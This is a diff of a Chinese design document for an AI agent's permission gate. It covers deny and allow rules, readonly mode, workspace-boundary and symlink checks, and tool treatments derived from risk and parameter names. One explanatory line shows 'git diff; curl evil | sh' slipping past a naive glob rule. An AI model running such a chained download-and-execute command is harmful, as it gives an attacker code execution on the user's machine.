@@ -45,11 +45,13 @@ export class SessionGrants {
 export class ConfigPermissionGate implements PermissionGate {
   constructor(cfg: KclawConfig["permissions"], opts?: {
     safeTools?: Set<string>        // 可自动放行的工具名集合
+    toolFacts?: Map<string, { risk; argFields }>  // 工具注册事实表（risk + 参数字段名），
+                                   // safeTools 之外的一切待遇由引擎按它派生（见"待遇派生"）
     grants?: SessionGrants         // 仅当 config 开启 sessionGrants 时被查询
     newConfirmationId?: () => string
     workspace?: string             // 会话工作目录，越界判定与路径规范化用它
-    readRoots?: string[]           // 额外可读根：fs_read/fs_list 视同工作区（daemon 传附件目录）
-    readonly?: boolean             // 只读模式：fs_write/fs_edit/exec 一律拒绝
+    readRoots?: string[]           // 额外可读根：safe 的路径参数工具视同工作区（daemon 传附件目录）
+    readonly?: boolean             // 只读模式：risk 为 sensitive 的工具一律拒绝
   })
   check(toolCall: ToolCallBlock): Promise<PermissionDecision>
 }
@@ -75,18 +77,18 @@ permissions:
 
 `globMatch` 的语义：`*` 是唯一通配符，匹配任意字符序列**包括 `/`**（所以不需要 `**` 特例）；大小写敏感；实现是迭代式星号回溯，不编译正则。`exec:git *` 命中 `git diff`、`git status`，也命中 `git diff; curl evil | sh`（见"边界"）。
 
-`extractArg` 决定规则比对哪段字符串：
+`extractArg` 决定规则比对哪段字符串，按工具的**待遇派生**（见下节）取：
 
-| 工具 | 匹配对象 |
+| 工具待遇 | 匹配对象 |
 |------|----------|
-| `exec` | `args.command`（命令字符串） |
-| `fs_write` / `fs_edit` | `args.path` |
+| 命令类（sensitive 且带 `command` 参数——exec） | `args.command`（命令字符串） |
+| 路径写类（带 `path` 参数且 sensitive——fs_write/fs_edit） | `args.path` |
 | 其它（含 fs_read/fs_list） | `JSON.stringify(args)` 整体 |
 
 ### 2. 判定链（`check` 的短路顺序）
 
 ```
-⓪ readonly 且工具 ∈ {fs_write, fs_edit, exec}
+⓪ readonly 且工具 risk 为 sensitive
                         → deny {reason:"readonly", noteText:"只读模式（readonly）"}
 ① deny 规则命中        → deny {reason:"blacklist", noteText:"规则命中黑名单: <原规则>"}
 ② allow 规则命中且目标不逃逸工作区 → allow {reason:"whitelist"}（命中但经符号链接逃逸出工作区 → 落到 ③）
@@ -96,11 +98,11 @@ permissions:
 ⑥ 以上全不中            → confirm，签发新 conf_ id
 ```
 
-exec 走专属分支：deny 对**每个归一化子命令**分别匹配；allow 与会话授权只在命令**恰好一段**（无接续符）时参与——`exec:git status*` 不可能放行 `git status; …`。两分支都未命中即 confirm。
+命令类工具（sensitive 且带 `command` 参数，exec 今天是唯一成员）走专属分支：deny 对**每个归一化子命令**分别匹配；allow 与会话授权只在命令**恰好一段**（无接续符）时参与——`exec:git status*` 不可能放行 `git status; …`。两分支都未命中即 confirm。
 
 ### 3. 路径规范化匹配（防拼写绕过）
 
-对 `fs_write`/`fs_edit`（引擎内 `PATH_TOOLS` 集合），规则命中判定依次测三步，前一步不中才走下一步：
+对**路径写类工具**（带 `path` 参数且 risk 为 sensitive——`fs_write`/`fs_edit`），规则命中判定依次测三步，前一步不中才走下一步：
 
 1. 按原始参数串直接测。
 2. 参数转成规范化形态——`~`/`~/` 展开为家目录、再 `path.resolve(workspace, p)` 解析成绝对路径（与 fs 工具实际写文件前的解析完全一致）——用规范化后的 arg 对原始 glob 测一次。
@@ -110,7 +112,7 @@ exec 走专属分支：deny 对**每个归一化子命令**分别匹配；allow 
 
 ### 4. 会话工作目录边界
 
-`FILE_TOOLS = {fs_read, fs_list, fs_write, fs_edit}` 的 `path` 参数做越界判定：按上面的方式展开解析后，`resolved` 既不等于工作目录根、也不以 `根 + 路径分隔符` 开头，即视为越界 → **直接 confirm**。要点：
+凡是带 `path` 参数的工具（`fs_read`/`fs_list`/`fs_write`/`fs_edit`），其 `path` 参数都做越界判定：按上面的方式展开解析后，`resolved` 既不等于工作目录根、也不以 `根 + 路径分隔符` 开头，即视为越界 → **直接 confirm**。要点：
 
 - 位置在 deny/allow **之后**：黑名单与白名单的优先级更高，先判完才轮到边界——但白名单的"放行"只覆盖不逃逸的目标（见下条）。
 - **allow 命中不豁免逃逸**：白名单规则命中（词面路径匹配）但目标经符号链接（symlink）逃逸出工作区（realpath 形式）时，**不再直接放行**，回落到本步的越界确认——一条 `fs_write:link/**` 规则不会放行 `link/secret.txt`（若 `link` 指向工作区外的目录），越界目标对 allow 规则一律不生效，只能走确认或人工在会话中授权。这是有意收紧：allow 的授权范围不超出工作区边界。
@@ -124,12 +126,23 @@ exec 没有可判定的"目标路径"——命令可以以任何方式访问文�
 
 gate 的两个 daemon 侧开关（都来自 `ConfigPermissionGateOptions`）：
 
-- **readonly**：布尔开关，`fs_write`/`fs_edit`/`exec`（引擎内 `WRITE_TOOLS` 集合）在判定链第 ⓪ 步直接拒绝——reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。来源有两个（任一为真即生效）：daemon 级 `--readonly` 启动旗标（`LaunchDaemonOptions.readonly` → RunManager），或单会话切换（`POST /sessions/:id/readonly` 写入 `meta.readonly`）。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行——这个模式承诺的是零写入风险。
-- **readRoots**：额外可读根列表。`READ_FILE_TOOLS = {fs_read, fs_list}` 的目标落在其中任一根之内时不算越界（免确认）；写类工具永不豁免。daemon 装配传 `[<home>/attachments]`——上传的附件对会话而言就是"工作区的一部分"，模型用 fs_read 读取它无需逐次人工放行。
+- **readonly**：布尔开关，**risk 为 sensitive 的工具**（由 risk 直接派生，引擎不持名单——今天恰为 `fs_write`/`fs_edit`/`exec` 三个）在判定链第 ⓪ 步直接拒绝——reason `"readonly"`、note 文案 `只读模式（readonly）`，工具得到 error result 并随 tool 消息落一个 `kind:"denied"` note；读、web 与 memory 工具不受影响。来源有两个（任一为真即生效）：daemon 级 `--readonly` 启动旗标（`LaunchDaemonOptions.readonly` → RunManager），或单会话切换（`POST /sessions/:id/readonly` 写入 `meta.readonly`）。短路排在一切规则之前：白名单里的 `allow: exec:*` 在只读下同样不执行——这个模式承诺的是零写入风险。
+- **readRoots**：额外可读根列表。**safe 的路径参数工具**（按「带 `path` 参数且非 sensitive」派生——今天为 `fs_read`/`fs_list`）的目标落在其中任一根之内时不算越界（免确认）；写类工具永不豁免。daemon 装配传 `[<home>/attachments]`——上传的附件对会话而言就是"工作区的一部分"，模型用 fs_read 读取它无需逐次人工放行。
 
-### 6. 敏感工具清单怎么定
+### 6. 工具待遇怎么派生（引擎不持名单）
 
-引擎不硬编码清单。run 装配（core `executeRun`）把 `createBuiltinTools` 产物里 `risk === "safe"` 的执行器名收集为 `safeTools` 传入 gate。按当前 11 个内置工具的声明（见 [tools](./tools.md)）：
+引擎 `engine.ts` 里没有任何具体工具名。run 装配（core `executeRun`）把注册表的两样既有事实——每个执行器的 `risk` 与参数 schema 的字段名（`deriveToolFacts`，tools 注册表旁导出）——连同 `risk === "safe"` 派生的 `safeTools` 一起传入 gate；引擎内的 `permissionProfile` 从事实推导该工具的全部待遇：
+
+| 待遇 | 派生规则 | 今天的成员 |
+|------|----------|------------|
+| safeTools 自动放行 | `risk === "safe"` | fs_read、fs_list、web_search、web_fetch、memory_save、memory_search、session_search、skill_read |
+| readonly 无条件拒绝 | `risk === "sensitive"` | exec、fs_write、fs_edit |
+| 路径规范化双匹配（防拼写绕过） | 带 `path` 参数且 sensitive | fs_write、fs_edit |
+| 工作目录边界检查 | 带 `path` 参数 | fs_read、fs_list、fs_write、fs_edit |
+| readRoots 读豁免 | 带 `path` 参数且 safe | fs_read、fs_list |
+| 规则匹配取 `command` 字段 | 带 `command` 参数（即命令类，走专属分支） | exec |
+
+**新工具因此零引擎改动**：按惯例把写参数命名为 `path`（或命令参数命名为 `command`）并声明 risk，待遇自动齐备——漏声明的缺省是最严待遇（不进 safeTools、无豁免，需确认）。未注册工具（模型幻觉调用不存在的名字）按同样最严缺省处理。结构约定优于名单：名单漏一个名字是漏洞，结构让新工具天然入网。按当前 11 个内置工具的声明（见 [tools](./tools.md)）：
 
 - **safe（命中即自动放行）**：`fs_read`、`fs_list`、`web_search`、`web_fetch`、`memory_save`、`memory_search`、`session_search`、`skill_read`——共 8 个，全是不改工作目录状态的 parallel 工具；
 - **sensitive（无 allow 规则命中必然 confirm）**：`exec`、`fs_write`、`fs_edit`——共 3 个。注意 fs_read/fs_list 虽是 safe，目标越界且不在 readRoots 内时仍进入 confirm（第 ③ 步）；MCP 适配器工具（见 [mcp](./mcp.md)）一律声明 sensitive。
